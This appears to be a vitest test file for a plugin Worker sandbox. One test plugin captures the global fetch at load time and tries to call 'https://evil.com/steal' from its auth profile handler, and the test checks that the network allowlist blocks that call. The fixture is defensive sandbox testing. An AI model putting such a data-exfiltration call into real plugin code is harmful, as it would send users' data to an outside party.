import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { PluginCallError } from './runtime';
import {
	CALL_PATH,
	GUARD_MODULE,
	pluginScriptName,
	SECRET_HEADER,
	WorkerRuntime,
	workerModules
} from './worker';

/** A plugin's bundled `server.js`; `fetch` is captured before any handler runs. */
const PLUGIN_CODE = `
const early = fetch;

export default {
	authProviders: {
		example: {
			authorizeUrl: 'https://example.com/authorize',
			tokenUrl: 'https://example.com/token',
			scopes: ['user'],
			pkce: true,
			async profile(accessToken, credentials, ctx) {
				const response = await ctx.fetch('https://api.example.com/user', {
					headers: { authorization: 'Bearer ' + accessToken }
				});
				const user = await response.json();
				let global = 'allowed';

				try {
					await early('https://evil.com/steal');
				} catch (error) {
					global = error.message;
				}

				return {
					id: String(user.id),
					email: null,
					emailVerified: false,
					name: credentials.clientId + ' ' + ctx.plugin.id + '@' + ctx.plugin.version,
					avatarUrl: global
				};
			}
		}
	}
};
`;

const SECRET = 'secret-value';

type Worker = { fetch(request: Request, env: Record<string, string>): Promise<Response> };

let dir: string;
let worker: Worker;
let restore: () => void;
const originalFetch = globalThis.fetch;
const upstream: string[] = [];

beforeAll(async () => {
	if (!('timingSafeEqual' in crypto.subtle)) {
		Object.defineProperty(crypto.subtle, 'timingSafeEqual', {
			configurable: true,
			value: (a: Uint8Array, b: Uint8Array) => a.every((byte, index) => byte === b[index])
		});
	}

	globalThis.fetch = (async (input: RequestInfo | URL) => {
		const request = input instanceof Request ? input : new Request(input);

		upstream.push(request.url);

		return Response.json({ id: 42 });
	}) as typeof fetch;

	dir = await mkdtemp(join(tmpdir(), 'pouchbase-plugin-worker-'));

	const modules = workerModules(
		{ id: 'auth-example', version: '1.2.3', permissions: { network: ['api.example.com'] } },
		PLUGIN_CODE
	);

	for (const module of modules) {
		await writeFile(join(dir, module.name), module.content);
	}

	const entry = await import(/* @vite-ignore */ pathToFileURL(join(dir, modules[0]!.name)).href);
	const guard = await import(/* @vite-ignore */ pathToFileURL(join(dir, GUARD_MODULE)).href);

	worker = entry.default;
	restore = guard.restoreGlobals;
});

afterAll(async () => {
	restore?.();
	globalThis.fetch = originalFetch;
	await rm(dir, { recursive: true, force: true });
});

function runtime(secret = SECRET) {
	return new WorkerRuntime('https://plugin.example.workers.dev', secret, {
		fetch: ((input: RequestInfo | URL, init?: RequestInit) =>
			worker.fetch(new Request(input, init), {
				POUCHBASE_PLUGIN_SECRET: SECRET
			})) as typeof fetch
	});
}

describe('plugin Worker', () => {
	it('describes the plugin', async () => {
		await expect(runtime().call({ type: 'describe' })).resolves.toEqual({
			authProviders: {
				example: {
					authorizeUrl: 'https://example.com/authorize',
					tokenUrl: 'https://example.com/token',
					scopes: ['user'],
					pkce: true
				}
			},
			fields: [],
			routes: []
		});
	});

	it('runs profile with an allowlisted fetch, also for fetch captured at load', async () => {
		const profile = await runtime().call({
			type: 'profile',
			provider: 'example',
			accessToken: 'token',
			credentials: { clientId: 'client' }
		});

		expect(profile).toEqual({
			id: '42',
			email: null,
			emailVerified: false,
			name: 'client auth-example@1.2.3',
			avatarUrl: 'evil.com is not in permissions.network'
		});
		expect(upstream).toEqual(['https://api.example.com/user']);
	});

	it('reports errors of the plugin', async () => {
		await expect(
			runtime().call({
				type: 'profile',
				provider: 'constructor',
				accessToken: 'token',
				credentials: { clientId: 'client' }
			})
		).rejects.toThrow(new PluginCallError('The plugin has no auth provider constructor'));
	});

	it('answers 404 without the secret or on other paths', async () => {
		await expect(runtime('wrong-secret').call({ type: 'describe' })).rejects.toThrow(
			'answered 404'
		);

		const env = { POUCHBASE_PLUGIN_SECRET: SECRET };
		const other = await worker.fetch(
			new Request('https://plugin.example.workers.dev/', {
				method: 'POST',
				headers: { [SECRET_HEADER]: SECRET }
			}),
			env
		);
		const get = await worker.fetch(
			new Request(`https://plugin.example.workers.dev${CALL_PATH}`, {
				headers: { [SECRET_HEADER]: SECRET }
			}),
			env
		);
		const noSecretSet = await worker.fetch(
			new Request(`https://plugin.example.workers.dev${CALL_PATH}`, {
				method: 'POST',
				headers: { [SECRET_HEADER]: '' }
			}),
			{}
		);

		expect([other.status, get.status, noSecretSet.status]).toEqual([404, 404, 404]);
	});
});

describe('pluginScriptName', () => {
	it('prefixes the instance', () => {
		expect(pluginScriptName('pouchbase', 'auth-google')).toBe('pouchbase-plugin-auth-google');
	});

	it('keeps long names within 63 characters, stable and distinct', () => {
		const id = 'a-very-long-plugin-id-that-goes-on-and-on-and-on-forever';
		const name = pluginScriptName('my-pouchbase-instance', id);

		expect(name.length).toBeLessThanOrEqual(63);
		expect(name).toBe(pluginScriptName('my-pouchbase-instance', id));
		expect(name).not.toBe(pluginScriptName('my-pouchbase-instance', `${id}-2`));
	});
});
